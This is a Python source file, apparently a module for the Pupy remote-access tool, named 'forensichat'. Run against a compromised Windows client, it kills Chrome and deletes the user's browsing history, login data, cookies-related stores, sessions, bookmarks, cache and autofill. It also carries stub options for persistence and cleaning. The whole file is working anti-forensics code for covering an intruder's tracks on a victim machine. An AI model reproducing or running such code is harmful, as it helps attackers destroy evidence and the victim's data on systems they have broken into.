# -*- coding: UTF8 -*-

# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import *
import os
import StringIO
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="forensichatModule"

class forensichatModule(PupyModule):
	""" execute cleaning routines """
	@windows_only
	def is_compatible(self):
		pass

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='forensichat', description=self.__doc__)
		self.arg_parser.add_argument('-p', '--persist', help='run the persistance script')
		self.arg_parser.add_argument('-c', '--clean', help='run the cleaning script')


	def run(self, args):
		self.client.load_package("_sqlite3")
		self.client.load_package("sqlite3")
		print self.client.load_dll("packages/windows/x86/sqlite3.dll")
		
		
		self.client.conn.modules['_sqlite3']
		self.client.conn.modules['sqlite3']
		#self.client.conn.modules["pupwinutils.processes"].enum_processes()
		with redirected_stdio(self.client.conn):
			self.info("gotsql")	
			self.client.load_package("getpass")
			u=self.client.conn.modules['getpass'].getuser()

			x = "adamschaal"
			#self.info("goinin")
			self.client.load_package("forenmod.forenpackage")
			#self.info("a")
			self.client.conn.modules['forenmod.forenpackage'].kill_chrome()
			#self.info("b")
			self.client.conn.modules['forenmod.forenpackage'].fix_crash(u)
			#self.info("c")
			self.client.conn.modules['forenmod.forenpackage'].del_hist(x,u)
			#self.info("d")
			self.client.conn.modules['forenmod.forenpackage'].del_Topsite(x,u)
			#self.info("e")
			self.client.conn.modules['forenmod.forenpackage'].del_Favicons(x,u)
			#self.info("f")
			self.client.conn.modules['forenmod.forenpackage'].del_loginData(x,u)
			#self.info("g")
			self.client.conn.modules['forenmod.forenpackage'].del_NAP(x,u)
			#self.info("h")
			self.client.conn.modules['forenmod.forenpackage'].del_Shortcuts(x,u)
			#self.info("i")
			self.client.conn.modules['forenmod.forenpackage'].rm_CurrentTabs(u)
			#self.info("j")
			self.client.conn.modules['forenmod.forenpackage'].rm_CurrentSession(u)
			#self.info("k")
			self.client.conn.modules['forenmod.forenpackage'].rm_LastTabs(u)
			#self.info("l")
			self.client.conn.modules['forenmod.forenpackage'].rm_LastSession(u)
			#self.info("m")
			self.client.conn.modules['forenmod.forenpackage'].rm_bookmarks(u)
			#self.info("n")
			self.client.conn.modules['forenmod.forenpackage'].rm_Cache(u)
			#self.info("o")
			self.client.conn.modules['forenmod.forenpackage'].rm_autofill(u)
			#self.info("p")
			self.client.conn.modules['forenmod.forenpackage'].rm_visited(u)
			#del_Cookies(x,u)
			#self.info("goinout")


		if args.clean:
			self.info("clean...")

		if args.persist:
			self.info("persist...")
		
		self.success("succesfully cleaned the client")

